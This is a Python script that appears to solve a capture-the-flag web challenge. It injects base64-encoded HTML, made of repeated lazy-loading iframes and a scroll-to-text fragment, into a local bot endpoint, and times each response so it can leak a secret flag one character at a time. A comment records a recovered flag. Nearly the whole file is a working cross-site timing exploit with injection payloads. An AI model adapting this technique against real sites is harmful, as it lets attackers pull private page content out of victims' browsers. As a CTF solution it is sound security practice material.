import requests
import string
import time
import base64
from urllib.parse import quote

 
charset = 'ar3_tc'+string.ascii_letters +  string.digits + '{}_.-'
flag = 'd0nt'
# d0ntul0v3th1sf34tur3

# BASE = 'http://127.0.0.1:1234/bot?leaf='
BASE = 'http://127.0.0.1:8800/bot?leaf='

# initial request to star the browser
requests.get(BASE, allow_redirects=False)


while len(flag) < 1 or flag[-1] != '}':
    time_taken = []
    for i in charset:
        guess = i
        payload = '<iframe/src="x"/loading=lazy></iframe>'*100
        initial = '</div>'
        data = f"""{initial}{payload}<a/id=flag>{flag}{guess}</a>{payload}#:~:text={flag}{guess}"""
        data = base64.b64encode(data.encode()).decode()
        url = BASE  + quote(data)
        start = time.time()
        response = requests.get(url, timeout=10, allow_redirects=False)
        end = time.time()
        time_taken.append(end - start)
        print(f'guess: {guess} time taken: {end - start:.8f}s')
        time.sleep(1)

    min_index = time_taken.index(min(time_taken))
    flag += charset[min_index]
    print('current flag:', flag)
